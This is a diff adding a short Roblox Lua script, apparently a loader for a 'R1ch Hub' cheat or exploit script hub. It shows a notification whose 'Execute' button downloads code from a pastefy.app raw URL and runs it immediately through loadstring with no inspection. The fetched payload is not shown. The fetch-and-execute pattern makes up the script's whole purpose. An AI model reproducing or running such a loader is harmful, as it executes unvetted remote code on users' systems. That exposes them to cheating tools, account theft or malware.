@@ -1,0 +1,30 @@
+local function callback(Text)
+ if Text == "Execute" then
+  print ()
+  game.StarterGui:SetCore("SendNotification",  {
+ Title = "Executed !";
+ Text = "R1ch Hub";
+ Icon = "rbxthumb://type=Asset&id=15428299938&w=150&h=150";
+ Button1 = "Continue";
+ Duration = 50;
+ Callback = NotificationBindable;
+}) 
+loadstring(game:HttpGet(('https://pastefy.app/EJCkQkuO/raw'),true))()
+elseif Text == ("Close") then
+ print ("Answer2")
+ end
+end
+
+local NotificationBindable = Instance.new("BindableFunction")
+NotificationBindable.OnInvoke = callback
+--
+
+game.StarterGui:SetCore("SendNotification",  {
+ Title = "Welcom !";
+ Text = "R1ch Hub";
+ Icon = "rbxthumb://type=Asset&id=15428299938&w=150&h=150";
+ Duration = 50;
+ Button1 = "Execute";
+ Button2 = "Close";
+ Callback = NotificationBindable;
+}) 
